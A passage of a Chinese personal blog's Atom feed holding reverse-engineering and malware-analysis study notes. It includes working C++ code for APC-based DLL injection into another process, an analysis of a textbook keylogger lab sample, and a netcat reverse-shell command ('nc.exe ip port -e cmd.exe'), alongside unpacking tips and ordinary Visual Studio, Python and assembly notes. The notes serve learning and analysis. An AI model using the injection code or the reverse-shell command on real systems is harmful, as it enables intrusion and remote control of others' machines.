+    <content type="html"><![CDATA[<p>APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：</p><pre><code>1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</code></pre><p>程序如下:</p><pre><code>// TESTAPC2.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;string&gt;#include&lt;windows.h&gt;#include&lt;shlwapi.h&gt;#include&lt;tlhelp32.h&gt;#include&lt;winternl.h&gt;#pragma comment(lib,&quot;shlwapi.lib&quot;)#pragma comment(lib,&quot;ntdll.lib&quot;)using namespace std;//根据进程名获取PIDDWORD GetPidFormName(wstring wsProcessname){    HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (hSnaoshot == INVALID_HANDLE_VALUE)    {        return false;    }    PROCESSENTRY32W pe = { sizeof(pe) };    BOOL bok;    for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe))    {        wstring wsNowProcName = pe.szExeFile;        if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL)        {            CloseHandle(hSnaoshot);            return pe.th32ProcessID;        }    }    CloseHandle(hSnaoshot);    return 0;}//dll 文件注入到进程wsProcessnameBOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]){    DWORD dwProcessId = GetPidFormName(wsProcessname);    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);    if (!hProcess)    {        return FALSE;    }    PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    DWORD dwRet;    if (lpData)    {        //在远程进程申请空间写入待注入dll 的路径        WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet);        CloseHandle(hProcess);    }    //开始注入    THREADENTRY32 te = { sizeof(te) };    HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程    if (handleSnap == INVALID_HANDLE_VALUE)    {        return false;    }    bool bstat = false;    if (Thread32First(handleSnap, &amp;te))    {        do {            if (te.th32OwnerProcessID == dwProcessId)            {                HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);                if (handleThread)                {                    DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData);                }                if (dwRet &gt; 0)                {                    bstat = TRUE;                }                CloseHandle(handleThread);            }        } while (Thread32Next(handleSnap, &amp;te));        CloseHandle(handleSnap);        return bstat;    }    }    int main()    {        Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;);        return 0;    }</code></pre><p>测试exe程序：</p><pre><code>#include&lt;windows.h&gt;int main(){    MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK);    SleepEx(1000 * 60 * 5, true);    MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK);    Sleep(-1);}</code></pre><p>测试dll 程序：</p><pre><code>#include&lt;windows.h&gt;#include&quot;dll.h&quot;BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved){    switch (dwReason)    {        // 动态链接库映射到某个进程的地址空间    case DLL_PROCESS_ATTACH:        MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK);        /**        * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作，        * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了        **/        break;        // 应用程序创建新的线程    case DLL_THREAD_ATTACH:        break;        // 应用程序某个线程正常终止    case DLL_THREAD_DETACH:        break;        // 动态链接库将被卸载    case DLL_PROCESS_DETACH:        /**        * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作        * 如关闭文件，释放内存空间等        **/        break;    }    return 1;}/*void helloDLL(void){//MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK);}*/</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VS错误集</title>
+    <link href="http://18428381824.github.io/2017/09/14/vs%E9%94%99%E8%AF%AF%E9%9B%86/"/>
+    <id>http://18428381824.github.io/2017/09/14/vs错误集/</id>
+    <published>2017-09-13T16:00:00.000Z</published>
+    <updated>2017-10-25T04:01:47.164Z</updated>
+    
+    <content type="html"><![CDATA[<p>一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window    F:\c\window\window\MSVCRTD.lib(exe_main.obj)    </p><p>&emsp;&emsp;原因是c语言程序找不到适当的入口程序函数<br>般情况下，</p><p>&emsp;&emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目”</p><p>&emsp;&emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求</p><p>&emsp;&emsp;如果是windows程序：</p><ul><li><p>1.菜单中选择 工程-&gt;属性, 弹出属性窗口</p></li><li><p>2.在左边栏中依次选择：配置属性-&gt;C/C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS.</p></li><li><p>3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(/SUBSYSTEM:WINDOWS)<br>如果是控制台程序：</p></li><li><p>1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口</p></li><li>2.在左边栏中依次选择：配置属性-&gt;C/C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE.</li><li>3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(/SUBSYSTEM:CONSOLE)</li></ul><p>二  vs2015丢失msvcp140.dll 无法运行程序</p><p>1.可以选择静态编译</p><p><img src="https://i.imgur.com/hetjIa8.png" alt=""></p><p>初始状态是这样的</p><p><img src="https://i.imgur.com/pXqN4Tq.png" alt=""></p><p>2.安装vs2015运行库。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window    F:\c\window\window\MSVCRTD.lib(exe_main.obj
+      
+    
+    </summary>
+    
+      <category term="编程" scheme="http://18428381824.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="编程" scheme="http://18428381824.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sublime中文乱码处理</title>
+    <link href="http://18428381824.github.io/2017/09/13/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/"/>
+    <id>http://18428381824.github.io/2017/09/13/sublime乱码处理/</id>
+    <published>2017-09-12T16:00:00.000Z</published>
+    <updated>2017-10-25T07:30:17.720Z</updated>
+    
+    <content type="html"><![CDATA[<p>一、安装包管理器<br>使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码</p><pre><code>import urllib.request,os; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &apos;wb&apos;).write(urllib.request.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;,&apos; &apos;)).read())</code></pre><p>顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了</p><p>二、安装乱码处理插件：</p><pre><code>调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;一、安装包管理器&lt;br&gt;使用Ctrl+~快捷键或者通过View-&amp;gt;Show Console菜单打开命令行，粘贴如下代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import urllib.request,os; pf = &amp;apos;Package Control.sublim
+      
+    
+    </summary>
+    
+      <category term="杂学" scheme="http://18428381824.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
+    
+    
+      <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>shellcode 实现键盘记录样本分析</title>
+    <link href="http://18428381824.github.io/2017/09/11/shellcode%20%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
+    <id>http://18428381824.github.io/2017/09/11/shellcode 实现键盘记录样本分析/</id>
+    <published>2017-09-10T16:00:00.000Z</published>
+    <updated>2017-10-25T07:02:55.837Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.<br>2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到</p><pre><code>C:\WINDOWS\System32\inet_epar32.dllzzz69806582net start cisvcC:\WINDOWS\System32\%scisvc.exeLab11-03.dll</code></pre><p>等字符串，C:\WINDOWS\System32\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了</p><pre><code>C:\WINDOWS\System32\kernel64x.dllzzz69806582GetForegroundWindowGetAsyncKeyState</code></pre><p>等，C:\WINDOWS\System32\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。<br>3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控，</p><p><img src="https://i.imgur.com/7WpA6fl.png" alt=""></p><p>如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。<br>在进程栏看到了net start cisvc</p><p><img src="https://i.imgur.com/z1cNgvE.png" alt=""></p><p>在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe<br>但是并没有写入文件的操作。</p><p><img src="https://i.imgur.com/zKoDTRC.png" alt=""></p><p>在注册表一栏并没有看到什么信息。此时我们更换过滤条件，查看一下cisvc.exe进行了哪些操作。可以看到加载inet_epar32.dll，在系统文件夹中创建了kernel64x.dll文件，并写入了一些内容猜测是键盘记录的内容。</p><p><img src="https://i.imgur.com/8gZK3jo.png" alt=""></p><p>4.下面进行静态高级分析。把Lab11-03.exe和Lab11-03.dll分别载入ida进行分析。<br>代码反编译为c可以看到很简单。</p><p><img src="https://i.imgur.com/bE6edAP.png" alt=""></p><p>首先是把Lab11-03.dll复制为C:\WINDOWS\System32\inet_epar32.dll，然后sub_401070函数时对cisvc.exe的操作，看到是对cisvc.exe进行文件映射然后byte_409030位置的314个字节的内容写到cisvc.exe的开始位置，很显示cisvc.exe插入了一段shellcode,下面查看这段shellcode,在409030位置可以看到是原始字节内容，按c可以反汇编为汇编代码，如图</p><p><img src="https://i.imgur.com/LILvS7S.png" alt=""><br><img src="https://i.imgur.com/UQhv1WM.png" alt=""></p><p>如图是shellcode 代码，在sehcode 末尾是一些字符串，按a可以显示完整字符串，猜测此shellc是加载该dll,后面的字符串仍然不知道是什么。</p><p><img src="https://i.imgur.com/xjBjblH.png" alt=""></p><p>此时我们用ida加载inet_epart32.dll也即是Lab11-03.dll，在导出函数中我们可以看到是以上的未知字符串刚好是其的导出函数，分析该函数看到仅仅只是创建了一个线程，分析该线程，可以看到此线程是实现键盘记录的，其记录保存在C:\WINDOWS\System32\kernel64x.dll中。</p><p>下面对cisvc.exe进行分析。分析插入shellcode前后的变化。首先用PE view查看pe头的变化。可以看到入口位置发生了变化。</p><p><img src="https://i.imgur.com/JjL5XdL.png" alt=""></p><p>分别用ida载入，可以看到插入shellcode的cisvc.exe入口点直接就是shellcode代码，在od中载入，然后单步运行观察shellcode的功能。</p><p><img src="https://i.imgur.com/4NzLH89.png" alt=""></p><p>如图1001b0a位置是加载C:\WINDOWS\System32\inet_epar32.dll的位置，下面是获取<br>zzz69806582函数地址。到此整个流程就分析完了。</p><p>Lab11-03.exe把Lab11-03.dll复制为C:\WINDOWS\System32\inet_epar32.dll，启动cisvc服务，然后再cisvc.exe中插入一段shellcode，来实现键盘记录，记录保存在C:\WINDOWS\System32\kernel64x.dll。打开notepad随便输入进行测试，然后用flexhex打开C:\WINDOWS\System32\kernel64x.dll，可以看到记录了notepad和输入的内容。<br><img src="https://i.imgur.com/D2eC7AJ.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.&lt;br&gt;2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:\WINDOWS\System32\
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>常规脱壳</title>
+    <link href="http://18428381824.github.io/2017/08/09/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/"/>
+    <id>http://18428381824.github.io/2017/08/09/常规脱壳/</id>
+    <published>2017-08-08T16:00:00.000Z</published>
+    <updated>2017-10-25T06:54:05.611Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.单步跟</p><p>2.esp</p><p>3.二次内存镜像</p><p>4.一次到位</p><p>5.模拟跟踪</p><blockquote><p>tc eip&lt;sfx</p><p>调试 sfx  第二个</p></blockquote><p>6.最后一次异常</p><p>7.特殊方法</p><p>at GetVersion等</p><p>注意：当用OD插件脱壳后不能运行时，可以用loadpe修正镜像大小，然后再重建输入表，再看是否成功，不行的话，手动找一找IAT的起始位置和结束为止，看Import REC 的RVA和大小是否一致，如果还不行就用load pe重建PE</p><p>常用语言的入口特征：</p><p>VB：</p><pre><code>004012D4 &gt;  68 54474000     push QQ个性网.00404754004012D9    E8 F0FFFFFF     call &lt;jmp.&amp;MSVBVM60.#100&gt;004012DE    0000            add byte ptr ds:[eax],al004012E0    0000            add byte ptr ds:[eax],al004012E2    0000            add byte ptr ds:[eax],al004012E4    3000            xor byte ptr ds:[eax],al004012E6    0000            add byte ptr ds:[eax],al004012E8    48              dec eax</code></pre><p>delphi:</p><pre><code>004A5C54 &gt;  55              push ebp004A5C55    8BEC            mov ebp,esp004A5C57    83C4 F0         add esp,-10004A5C5A    B8 EC594A00     mov eax,openpro.004A59EC</code></pre><p>BC++:</p><pre><code>00401678 &gt; /EB 10           jmp short btengine.0040168A0040167A   |66:623A         bound di,dword ptr ds:[edx]0040167D   |43              inc ebx0040167E   |2B2B            sub ebp,dword ptr ds:[ebx]00401680   |48              dec eax00401681   |4F              dec edi00401682   |4F              dec edi00401683   |4B              dec ebx00401684   |90              nop00401685  -|E9 98005400     jmp 009417220040168A   \A1 8B005400     mov eax,dword ptr ds:[54008B]0040168F    C1E0 02         shl eax,200401692    A3 8F005400     mov dword ptr ds:[54008F],eax00401697    52              push edx00401698    6A 00           push 00040169A    E8 99D01300     call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt;0040169F    8BD0            mov edx,eax</code></pre><p>VC++:</p><pre><code>0040A41E &gt;  55              push ebp0040A41F    8BEC            mov ebp,esp0040A421    6A FF           push -10040A423    68 C8CB4000     push 跑跑排行.0040CBC80040A428    68 A4A54000     push &lt;jmp.&amp;MSVCRT._except_handler3&gt;0040A42D    64:A1 00000000  mov eax,dword ptr fs:[0]0040A433    50              push eax0040A434    64:8925 0000000&gt;mov dword ptr fs:[0],esp0040A43B    83EC 68         sub esp,680040A43E    53              push ebx0040A43F    56              push esi0040A440    57              push edi</code></pre><p>MASM(汇编):</p><pre><code>004035C9 &gt;  6A 00           push 0004035CB    E8 A20A0000     call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt;004035D0    A3 5B704000     mov dword ptr ds:[40705B],eax004035D5    68 80000000     push 80004035DA    68 2C754000     push 11.0040752C004035DF    FF35 5B704000   push dword ptr ds:[40705B]004035E5    E8 820A0000     call &lt;jmp.&amp;kernel32.GetModuleFileNameA&gt;004035EA    E8 87070000     call 11.00403D76004035EF    6A 00           push 0004035F1    68 0B364000     push 11.0040360B004035F6    6A 00           push 0004035F8    6A 64           push 64004035FA    FF35 5B704000   push dword ptr ds:[40705B]</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.单步跟&lt;/p&gt;
+&lt;p&gt;2.esp&lt;/p&gt;
+&lt;p&gt;3.二次内存镜像&lt;/p&gt;
+&lt;p&gt;4.一次到位&lt;/p&gt;
+&lt;p&gt;5.模拟跟踪&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;tc eip&amp;lt;sfx&lt;/p&gt;
+&lt;p&gt;调试 sfx  第二个&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>字符串</title>
+    <link href="http://18428381824.github.io/2017/08/06/strings/"/>
+    <id>http://18428381824.github.io/2017/08/06/strings/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T08:59:08.244Z</updated>
+    
+    <content type="html"><![CDATA[<p>1 字符串添加</p><p>qq=’1265616844’<br>driver.get(‘<a href="http://user.qzone.qq.com/{}/311&#39;.format(qq" target="_blank" rel="external">http://user.qzone.qq.com/{}/311&#39;.format(qq</a>))<br>如上，在一堆字符串中添加某个字符串，可以用如上的方式</p><p>2.中文字符串</p><pre><code># _*_ coding: utf-8 _*_</code></pre><p>python 文件首行增加这一行，才可以输出中文，python默认以ASCII码来解析<br>对于windows的python文件保存为带bom 的utf-8也可以实现这个功能<br>文件的声明编码要和实际文件保存的编码一致，不然可能保存为gbk<br>要想命令行输出中文还要添加</p><pre><code>de_str1=str1.decode(&apos;utf-8&apos;)</code></pre><p>才可以在命令行正常输出中文</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1 字符串添加&lt;/p&gt;
+&lt;p&gt;qq=’1265616844’&lt;br&gt;driver.get(‘&lt;a href=&quot;http://user.qzone.qq.com/{}/311&amp;#39;.format(qq&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;htt
+      
+    
+    </summary>
+    
+      <category term="编程" scheme="http://18428381824.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="编程" scheme="http://18428381824.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>数据隐藏-ADS</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/"/>
+    <id>http://18428381824.github.io/2017/08/06/数据隐藏-ADS/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:08:12.659Z</updated>
+    
+    <content type="html"><![CDATA[<p>数据隐藏的一种方式–ADS</p><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p><p>详见<a href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin" target="_blank" rel="external">ADS</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;数据隐藏的一种方式–ADS&lt;/p&gt;
+&lt;p&gt;NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用N
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>netcat-反向shell</title>
+    <link href="http://18428381824.github.io/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/"/>
+    <id>http://18428381824.github.io/2017/08/06/netcat—反向shell/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:12:16.459Z</updated>
+    
+    <content type="html"><![CDATA[<p>利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell</p><p>1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe</p><p>2.linux 主机执行 nc  -l  -p 80</p><p>3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell&lt;/p&gt;
+&lt;p&gt;1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe&lt;/p&gt;
+&lt;p&gt;2.linux 主机执行 nc  -l 
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>进程替换的一种方式</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/"/>
+    <id>http://18428381824.github.io/2017/08/06/进程替换的一种检测方式/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:19:12.130Z</updated>
+    
+    <content type="html"><![CDATA[<p>进程替换问题</p><p>svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。</p><p><img src="http://i.imgur.com/3u192lY.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;进程替换问题&lt;/p&gt;
+&lt;p&gt;svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/3u192lY.png&quot; alt=&quot;&quot;&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>汇编知识学习</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://18428381824.github.io/2017/08/06/汇编知识学习/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:19:27.891Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.MOVSX  带符号扩展指令</p><pre><code>MOV BL,80H   MOVSX  AX,BLAX=0FF80H因为带符号扩展的时候，高位视为符号位，扩展的高位全置1</code></pre><p>2.neg eax  sbb eax ,eax</p><pre><code>例如 neg rsbb r-rneg eax 就是0-eax 其实际上就是设置标志位 cf=1 sbb eax,eax 就是eax-eax-cf如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1相当于r-r-cf=-1=oxffffffff注意： MOVzX  无符号扩展指令</code></pre><p>3.test 指令</p><pre><code>test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je  xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je  xxxx</code></pre><p>4.__alloca_probe</p><pre><code>逆向vc编译的程序，经常会看到这样的代码出现在函数头部：mov     eax, xxxxhcall    __alloca_probexxxxh是个立即数，一般大于1000h,即十进制数4096。这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。示例1：                 push    ebp                 mov     ebp, esp                 mov     eax, 8080h                 call    __alloca_probe示例2：                 push    ebp                 mov     ebp, esp                 and     esp, 0FFFFFFF8h                 push    0FFFFFFFFh                 push    offset SEH_4A7AA0                 mov     eax, large fs:0                 push    eax                 mov     large fs:0, esp                 push    ecx                 mov     eax, 8080h                 call    __alloca_probe事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。</code></pre><p>5.chkstk函数</p><pre><code>分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h,eax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。</code></pre><p>6.JGE.JLE,JNE,JE跳转条件</p><pre><code>JGE 大于等于跳转，JLE小于等于跳转，JNE不等于跳转，JE 前等于后跳转</code></pre><p>7.字符串入栈的操作：</p><pre><code>void main(){01361000  push        ebp  01361001  mov         ebp,esp  01361003  sub         esp,0Ch    //栈顶抬高12个字节01361006  mov         eax,dword ptr [___security_cookie (1363000h)]  0136100B  xor         eax,ebp  0136100D  mov         dword ptr [ebp-4],eax    //用了4个字节  int intA;  char ch[5]=&quot;abcd&quot;;01361010  mov         eax,dword ptr [string &quot;abcd&quot; (136210Ch)] 01361015  mov         cl,byte ptr ds:[1362110h]    //两句传送字符串”abcd\0”到寄存器  intA=15;  fun(intA,ch);0136101B  lea         edx,[ebp-0Ch] //0136101E  push        edx    //数组地址,ch[]0136101F  push        0Fh    //立即数参数,1501361021  push        offset string &quot;Integer:%d String:%s&quot; (13620F4h)  01361026  mov         dword ptr [ebp-0Ch],eax  01361029  mov         byte ptr [ebp-8],cl    //两句语句表示”abcd\0”写入栈中0136102C  call        dword ptr [__imp__printf (13620A0h)]  //调用printf}cl 这个赋值一直不太懂，后来知道了字符串要以00结尾才行，所以要再赋值cl为00，然后放在abcd的后面。</code></pre><p>8.atoi 函数 </p><pre><code>字符串转变为数字</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.MOVSX  带符号扩展指令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MOV BL,80H   
+MOVSX  AX,BL
+AX=0FF80H
+因为带符号扩展的时候，高位视为符号位，扩展的高位全置1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.neg eax  sbb eax ,eax&lt;
+      
+    
+    </summary>
+    
+      <category term="编程" scheme="http://18428381824.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="编程" scheme="http://18428381824.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>dll加载和劫持</title>
+    <link href="http://18428381824.github.io/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/"/>
+    <id>http://18428381824.github.io/2017/08/03/dll加载和劫持/</id>
